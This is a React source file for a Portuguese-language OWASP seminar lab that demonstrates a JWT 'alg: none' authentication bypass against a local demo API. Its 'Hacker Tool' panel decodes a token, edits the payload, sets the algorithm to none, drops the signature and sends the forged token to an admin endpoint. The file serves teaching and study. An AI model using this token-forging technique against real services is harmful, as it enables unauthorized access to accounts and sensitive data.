import React, { useState, useEffect } from 'react';
import './App.css';

const API_BASE = "http://localhost:1350/api";

// Helpers para base64url
const encode = (str: string) => btoa(str).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
const decode = (str: string) => {
  let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
  while (base64.length % 4 !== 0) base64 += '=';
  return atob(base64);
};

function App() {
  const [email, setEmail] = useState('larissa.moreira15@email.com');
  const [token, setToken] = useState('');
  const [response, setResponse] = useState<any>(null);
  const [status, setStatus] = useState<number | null>(null);

  // Estados para a Ferramenta Hacker (Forge)
  const [headerInput, setHeaderInput] = useState('');
  const [payloadInput, setPayloadInput] = useState('');

  const addLog = (res: any, status: number) => {
    setResponse(res);
    setStatus(status);
  };

  const handleLogin = async () => {
    try {
      const res = await fetch(`${API_BASE}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await res.json();
      if (res.status === 200) {
        setToken(data.data.token);
      }
      addLog(data, res.status);
    } catch (err: any) {
      addLog({ error: err.message }, 500);
    }
  };

  const makeRequest = async (path: string) => {
    try {
      const res = await fetch(`${API_BASE}${path}`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      const data = await res.json();
      addLog(data, res.status);
    } catch (err: any) {
      addLog({ error: err.message }, 500);
    }
  };

  const decodeCurrentToken = () => {
    try {
      const parts = token.split('.');
      if (parts.length >= 2) {
        setHeaderInput(decode(parts[0]));
        setPayloadInput(decode(parts[1]));
      }
    } catch (e) {
      alert("Erro ao decodificar token. Certifique-se que é um formato JWT válido.");
    }
  };

  const generateForgedToken = () => {
    try {
      const headerObj = JSON.parse(headerInput);
      headerObj.alg = "none";
      const forgedHeader = encode(JSON.stringify(headerObj));
      const forgedPayload = encode(payloadInput); // Já assumimos que o usuário editou o JSON no textarea
      const forgedToken = `${forgedHeader}.${forgedPayload}.`;
      setToken(forgedToken);
    } catch (e) {
      alert("Erro ao gerar token. Verifique se o cabeçalho e o payload são JSONs válidos.");
    }
  };

  return (
    <div className="container">
      <header className="header">
        <h1>OWASP Seminary: JWT Bypass Lab</h1>
        <p>Estudo de Vulnerabilidade: <strong>Broken Authentication & alg: none</strong></p>
      </header>

      <div className="grid">
        {/* LADO ESQUERDO: CONTROLE E REQUISIÇÕES */}
        <div className="panel">
          <h2 className="panel-title">1. Fluxo de Autenticação</h2>
          <div className="input-group">
            <label>E-mail do Usuário:</label>
            <input value={email} onChange={e => setEmail(e.target.value)} placeholder="Ex: larissa@email.com" />
          </div>
          <button className="btn-legit" onClick={handleLogin}>Fazer Login (Legítimo)</button>

          <h2 className="panel-title" style={{ marginTop: '30px' }}>2. Token Atual (Active)</h2>
          <textarea 
            rows={4} 
            value={token} 
            onChange={e => setToken(e.target.value)} 
            placeholder="Cole seu token aqui ou gere um via login..."
          />
          <p style={{fontSize: '0.8rem', color: '#8b949e'}}>Este é o token que será enviado no cabeçalho Authorization.</p>

          <h2 className="panel-title" style={{ marginTop: '30px' }}>3. Ações da API</h2>
          <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
            <button className="btn-neutral" onClick={() => makeRequest('/secure/auth')}>Validar (/secure/auth)</button>
            <button className="btn-hacker" onClick={() => makeRequest('/admin/data')}>Acessar Dados Sensíveis (/admin/data)</button>
          </div>
        </div>

        {/* LADO DIREITO: FERRAMENTA DE MANIPULAÇÃO (HACKER TOOL) */}
        <div className="panel" style={{ borderColor: 'var(--hacker-color)' }}>
          <h2 className="panel-title" style={{ color: 'var(--hacker-color)' }}>JWT Manipulator (Hacker Tool)</h2>
          <p>Use esta ferramenta para criar um token forjado com <code>alg: none</code>.</p>
          
          <button className="btn-neutral" style={{ width: '100%', marginBottom: '15px' }} onClick={decodeCurrentToken}>
            ⬇️ Carregar e Decodificar Token Atual
          </button>

          <div className="input-group">
            <label>Header (JSON):</label>
            <textarea rows={3} value={headerInput} onChange={e => setHeaderInput(e.target.value)} />
          </div>

          <div className="input-group">
            <label>Payload (JSON):</label>
            <textarea rows={8} value={payloadInput} onChange={e => setPayloadInput(e.target.value)} />
          </div>

          <button className="btn-hacker" style={{ width: '100%' }} onClick={generateForgedToken}>
            ⚡ Gerar Token Forjado (alg: none)
          </button>
          <p style={{fontSize: '0.8rem', color: '#f85149', marginTop: '10px'}}>
            Aviso: O token gerado será enviado automaticamente para o campo de "Token Ativo".
          </p>
        </div>

        {/* ÁREA DE RESPOSTA (FULL WIDTH) */}
        <div className="response-log">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
            <h3 style={{ margin: 0 }}>Server Response</h3>
            {status && (
              <span className={`status-badge status-${status}`}>
                STATUS: {status}
              </span>
            )}
          </div>
          <pre>
            {response ? JSON.stringify(response, null, 2) : "// As respostas da API aparecerão aqui..."}
          </pre>
        </div>
      </div>
    </div>
  );
}

export default App;
